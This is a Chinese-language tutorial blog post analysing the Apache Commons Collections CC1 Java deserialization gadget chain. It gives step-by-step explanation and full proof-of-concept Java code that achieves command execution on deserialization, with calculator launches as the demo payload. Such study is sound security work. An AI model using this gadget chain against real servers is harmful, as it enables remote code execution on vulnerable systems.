<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>疑问1: Java 中接口是不能实例化的，但是为啥可以这样写<code>Transformer[] transformers = new Transformer[]</code> ，P牛有在<strong>代码审计</strong>知识星球中回答：这里是<strong>实例化</strong>了一个<strong>数组</strong>，并不是实例化<code>Transformer</code>接口（大学学的知识都快忘完了）。</p>
<p>所以第一行是创建了一个数组，数组的类型是 <code>Transformer</code>, 该数组中有两个元素：</p>
<ul>
<li><p><strong>new ConstantTransformer(Runtime.getRuntime())</strong></p>
</li>
<li><p><strong>new InvokerTransformer(“exec”, new Class[]{String.class}, new Object[] {“&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator”})</strong></p>
</li>
</ul>
<h3 id="2-2-ConstantTransformer-类"><a href="#2-2-ConstantTransformer-类" class="headerlink" title="2.2 ConstantTransformer 类"></a>2.2 ConstantTransformer 类</h3><p>ConstantTransformer 是实现了Transformer接口的一个类，并且也实现了<code>Serializable</code>接口，说明是可序列化的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210609202433.png" alt="image-20210608115434960"></p>
<p>它的过程就是在构造函数的时候传入一个对象，并在<code>transform</code>方法将这个对象再返回。</p>
<h3 id="2-3-InvokerTransformer-类"><a href="#2-3-InvokerTransformer-类" class="headerlink" title="2.3 InvokerTransformer 类"></a>2.3 InvokerTransformer 类</h3><p>InvokerTransformer 也是实现了Transformer接口的一个类，有两个构造方法，也是实现了<code>Serializable</code>接口<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210609202441.png" alt="image-20210608204045987"></p>
<p>这里P牛使用的是第二个构造方法，传入了方法名为执行命令的<code>exec</code>方法，参数类型为数组<code>new Class[]&#123;String.class&#125;</code>，执行的是打开计算器 <code>new Object[] &#123;&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;&#125;</code></p>
<p>这里也实现了<code>transform</code>方法，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里通过 <code>input.getClass();</code> 获取对象，然后通过 <code>cls.getMethod(this.iMethodName, this.iParamTypes);</code> 传入方法名、方法的的参数类型来调用对象的方法，之后通过 <code>method.invoke(input, this.iArgs);</code> 来执行该方法。这也就是前面<a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484123&idx=1&sn=598d098ffe19be59547c09538716e196&chksm=c2829bc2f5f512d4e77af3085132c9cf18d9b2fec5abc1c0f6a120561d52be43be29ff0b2a92&scene=0&xtrack=1#rd">初探Java反序列化漏洞(二)</a>中说过的<strong>Java反射</strong>。</p>
<p>从这里我们能看出，<code>InvokerTransformer</code>这个类调用<code>transform</code>可以执行任意方法，这点非常关键，是反序列化能执行任意代码的关键。尝试使用<code>InvokeTransformer</code>来执行命令。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210609205307.png" alt="image-20210609205257230"></p>
<p>我们在这里可以尝试进行序列化与反序列化的利用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> con.yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/9 20:47</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 使用 InvokerTransformer 来执行命令</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">invoker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line"><span class="comment">//        invoker.transform(Runtime.getRuntime());</span></span><br><span class="line">        <span class="comment">// 将invokerTransformer进行序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./invoker.bin&quot;</span>));</span><br><span class="line">        outputStream.writeObject(invoker);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟目标后端程序接受到的序列化后的数据</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./invoker.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fi);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer1</span> <span class="operator">=</span> (InvokerTransformer) fin.readObject();</span><br><span class="line">        invokerTransformer1.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610213951.png" alt="image-20210609212210440"></p>
<p>虽然成功执行，但是单单利用<code>InvokeTransformer</code>类来进行反序列化漏洞的利用在实战中是条件极其苛刻的。</p>
<p>1.目标得恰巧利用<code>InvokerTransformer</code>将反序列化后的数据进行转型。</p>
<p>2.目标得在转型后，正好调用了<code>transform</code>，并且参数是攻击者可以控制的。</p>
<p>这样是行不通的，所以这一步只能是利用链中的一条线路，需要继续寻找可以用的点。</p>
<h3 id="2-4-ChainedTransformer-类"><a href="#2-4-ChainedTransformer-类" class="headerlink" title="2.4 ChainedTransformer 类"></a>2.4 ChainedTransformer 类</h3><p>这个同样是实现Transformer接口的一个类，也是实现了<code>Serializable</code>接口<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210609202448.png" alt="image-20210608210704229"></p>
<p>只有个接收数组，数组中元素类型为<code>Transformer</code>的一个有参构造方法。这里实现的<code>transform</code>方法的作用是：遍历执行传入数组元素的<code>transform</code>方法，同时将上个元素的返回对象作为s下个元素<code>transform</code>方法中的参数。</p>
<h3 id="2-5-TransformedMap-类"><a href="#2-5-TransformedMap-类" class="headerlink" title="2.5 TransformedMap 类"></a>2.5 TransformedMap 类</h3><p>TransformedMap 这个类是用来对 Map 进行某些变换用的，例如当我们修改Map中的某个值时，就会触发我们预先定义好的某些操作来对Map进行处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure>

<p>通过<code>decorate</code>函数就可以将一个普通的 Map 转换为一个<code>TransformedMap</code>。第二个参数和第三个参数分别对应当key改变和value改变时需要做的操作，都是<code>Transformer</code>类型，实现<code>transform(Object input)</code>方法即可进行实际的变换操作，按照如上代码生成<code>transformedMap</code>后，如果修改了其中的任意key或value，都会调用对应的<code>transform</code>方法去进行一些变换操作。</p>
<p>动手实验一下，帮助理解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> con.yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/8 21:25</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 当map 中的 key 变动时，输出一句话</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KeyUpdate</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;key update&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">KeyUpdate</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, transformer, <span class="literal">null</span>);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我通过实现了一个当 map 中的 key 变动时，输出一句话的功能。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210609202500.png" alt="image-20210608213206466"></p>
<h2 id="0x03-梳理P牛简化后的利用链"><a href="#0x03-梳理P牛简化后的利用链" class="headerlink" title="0x03 梳理P牛简化后的利用链"></a>0x03 梳理P牛简化后的利用链</h2><p>经过上面的逐行分析，现在我们可以复述一下Demo的运行逻辑：通过创建了一个<code>ChainedTransformer</code>，向其中传入一个<code>Transformer</code>类型的数组，该数组中有两个元素：第一个是<code>ConstantTransformer</code>;第二个是<code>InvokerTransformer</code>。</p>
<p>因为<code>TransformedMap.decorate()</code> 会在 map 中 key 或者 value 改变时，去执行时调用对应的<code>transformer</code>方法，而<code>ChainedTransformer</code>对象的 <code>transform</code>方法是遍历执行传入参数的<code>transform</code>方法。</p>
<p>所以当 map 中 key 或者 value 改变时，第一个元素<code>ConstantTransformer</code>会调用<code>transform</code>方法返回当前环境的<code>Runtime</code>对象，然后将<code>Runtime</code>对象作为数组第二个元素的<code>transform</code>方法的参数，而<code>InvokerTransformer</code>的<code>transform</code>方法是通过反射执行传入对象的方法，也就是下面的一个过程。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> con.yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/8 22:00</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> Runtime.getRuntime(); 	<span class="comment">// 第一个数组元素的执行返回结果</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;);</span><br><span class="line">        method.invoke(input, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;); <span class="comment">// 反射执行命令</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后通过 <code>outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</code> 时，触发<code>TransformedMap.decorate()</code>方法，执行上面一系列过程打开计算器，即执行命令。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210609202508.png" alt="image-20210608221034991"></p>
<p>上述过程并没有反序列化相关的链，只是一个本地运行的Demo，方便学习CommonCollections利用链的执行流程。而在实际的反序列化漏洞中，我们需要将上面最终生成的outerMap对象变成一个序列化流。</p>
<h2 id="0x04-通过反序列化执行触发漏洞"><a href="#0x04-通过反序列化执行触发漏洞" class="headerlink" title="0x04 通过反序列化执行触发漏洞"></a>0x04 通过反序列化执行触发漏洞</h2><p>上面的 Demo 需要我们手工执行改变 map 中的 key 的值，也就是手动执行 <code>outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</code>才可以触发命令执行，但在实际的应用中，不可能让我们手动执行，所以需要找到一个实现了<code>Serializable</code>的类，它在反序列化的readObject逻辑里有类似的写入操作。</p>
<p>这里配合我们执行代码的类就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，该类是java运行库中的一个类，实现了<code>Serializable</code>接口，并且包含一个<code>Map</code>对象属性，其<code>readObject</code>方法有自动修改自身Map属性的操作。</p>
<blockquote>
<p>  至于为什么最终会找到的这个类，我就不清楚了，应该需要对 java 的各种类都有个详细的了解。基于此我有个idea，来帮助快速寻找可能存在的利用链</p>
</blockquote>
<p>我们看下<code>jre/lib/rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class</code>这个类(jdk1.7.0_80)<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214036.png" alt="image-20210610075434821"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214042.png" alt="image-20210610082647689"></p>
<p>在<code>readObject</code>中遍历了 map ,然后在<code>var5.setValue()</code>会改变map中的 value，并且<strong>var2</strong> 和<strong>var4</strong>的值是可控的，都可以在构造方法中设置<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214048.png" alt="image-20210610082847106"></p>
<p>所以我们可以创建一个<code>AnnotationInvocationHandler</code>对象，将之前构造的POC放入<code>AnnotationInvocationHandler</code>对象中，当目标存在反序列化漏洞时，就会自动触发<code>setValue</code>操作改变map中的value的值，从而触发上面分析的过程，执行命令。</p>
<p>因为AnnotationInvocationHandler是一个内部类，不能通过new来实例化，所以需要用到反射来获取对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="comment">// 因为AnnotationInvocationHandler只有个私有的有参构造，所以需要getDeclaredConstructor获取</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">//设置所有的成员都可以访问</span></span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 获取对象，第一个参数是一个Annotation类; 第二个是参数就是前面构造的Map。</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class,outerMap);</span><br></pre></td></tr></table></figure>

<p>然后将代码拼接，并模拟一下序列化与反序列化的过程，看看能不能自动触发命令执行<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214056.png" alt="image-20210610083441461"></p>
<p>出错，这是因为<code>Runtime</code>没有继承<code>Serializer</code>接口，是无法进行序列化的，所以需要反射获取<code>Runtime</code>对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> con.yhy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/10 08:06</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 因为AnnotationInvocationHandler只有个私有的有参构造，所以需要getDeclaredConstructor获取</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//设置所有的成员都可以访问</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取对象，第一个参数是一个Annotation类; 第二个是参数就是前面构造的Map。</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class,outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将上述过程序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./exp.bin&quot;</span>));</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟目标后端程序接受到的序列化后的数据</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./exp.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fi);</span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们将<code>Runtime.getRuntime()</code>换成<code>Runtime.class</code>，前者是一个<code>java.lang.Runtime</code>对象，后者是一个<code>java.lang.Class </code>对象。Class类有实现Serializable接口，所以可以被序列化,之后利用反射的知识和InvokerTransformer实现的<code>transform</code>方法的特性获取<code>getRuntime</code>方法并执行。</p>
<p>改造完成后执行，我们发现虽然没有了错误，但还是没有执行命令。按理说我们的逻辑是通的：</p>
<ol>
<li><strong>sun.reflect.annotation.AnnotationInvocationHandler</strong>的<strong>readObject</strong>会调用我们传入map的setValue方法，改变 map 中的value的值;</li>
<li>当 map 中的 value 的值发生改变时会调用对应的<strong>transform</strong>方法,这里是ChainedTransformer的<strong>transform</strong>方法;</li>
<li>ChainedTransformer的<strong>transform</strong>方法，接受一个Transformer类型的数组，然后遍历执行数组中元素的<strong>transform</strong>方法，并且将上个元素的返回结果作为下个元素执行<strong>transform</strong>方法的参数;</li>
<li>然后我们利用了ConstantTransformer和InvokerTransformer精心构造了一个**Transformer[]**数组来执行命令</li>
</ol>
<p>在加入<code>AnnotationInvocationHandler</code>之前都是可以正常执行命令的，所以问题可能出在了<strong>AnnotationInvocationHandler</strong>的<strong>readObject</strong>方法，来调试一下看看，直接在<strong>AnnotationInvocationHandler#readObject</strong>这里下断点<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214106.png" alt="image-20210610171645781"></p>
<p>调试中发现，它在355行执行完后，直接到最后行末了，<code>var5.setValue</code>根本就没有执行的机会，在右下角的参数值里面可以看到 <code>this.memberValues</code>里根本就没有值，所以不会向下执行。</p>
<p>看了一下P牛的代码，发现在HashMap实例化后，添加了一个数据<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214115.png" alt="image-20210610173610117">然后就可以执行了，再次debug，可以看到在执行完第一句<code>var1.defaultReadObject();</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214122.png" alt="image-20210610173926189"></p>
<p><code>this.memberValues</code>就不为零了，然后经过测试发现<code>innerMap.put(&quot;value&quot;, &quot;yhy&quot;);</code> 只有添加的key的值为<strong>value</strong>才可以触发，只有当key为<code>value</code>时<code>var7 != null</code>才会成立，这点P牛给出的答案是：</p>
<blockquote>
<p>那么如何让这个var7不为null呢?这一块我就不详细分析了，还会涉及到Java注释(ps:这里应该是注解)相关的技术。直接给出两个条件:</p>
<ol>
<li><p>sun.reflect.annotation.AnnotationInvocationHandler构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</p>
</li>
<li><p>被TransformedMap.decorate修饰的Map中必须有一个键名为X的元素</p>
</li>
</ol>
<p>所以，这也解释了为什么我前面用到 Retention.class ，因为Retention有一个方法，名为value;所 以，为了再满足第二个条件，我需要给Map中放入一个Key是value的元素:</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214135.png" alt="image-20210610174833432"></p>
<p>P牛说的第一点应该是这里，<strong>sun.reflect.annotation.AnnotationInvocationHandler</strong>的构造方法里确实是这样要求的，传入的第一个参数只能为注解类型，<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214140.png" alt="image-20210610185739244"></p>
<p>为什么要有一个方法呢？<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214144.png" alt="image-20210610210327715"></p>
<p>这里的 var7 是经过传入的注解类实例化执行<code>memberTypes()</code>经过下面的转化过程，返回map，得到var3，转化过程可以debug看看，当注解类存在方法时会返回最下方框的一个map集合，这时<code>(Class)var3.get(var6);</code>才会存在值，即<code>var7 != null</code>。(存在方法的注解类有两个<code>Retention</code>和<code>Target</code>，这两个传入哪个都可以)<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214150.png" alt="image-20210610211055963"></p>
<p>下面找了一个不存在方法的注解类<code>Documented</code>进行对比，会发现最终返回时根本没有值。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214154.png" alt="image-20210610212059476"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210610214200.png" alt="image-20210610211721560"></p>
